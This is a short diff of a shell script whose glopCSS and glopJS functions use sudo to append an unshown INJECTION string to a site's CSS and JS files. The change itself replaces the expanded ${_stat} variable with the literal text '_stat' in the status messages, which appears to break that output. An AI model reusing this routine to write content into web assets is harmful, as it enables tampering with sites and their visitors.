@@ -36,7 +36,7 @@ glopCSS() {
 	 	sudo su -c "echo \"$INJECTION\" >> $_fileTarget"
 	done
 	_Type="css"
-	echo "${_stat} $RESULT $_Type files glopped"
+	echo "_stat $RESULT $_Type files glopped"
 }
 
 glopJS() {
@@ -61,7 +61,7 @@ glopJS() {
  	done
 	GETFILES=""
 	_Type="js"
-	echo "${_stat} $RESULT $_Type files glopped"
+	echo "_stat $RESULT $_Type files glopped"
 }
 
 
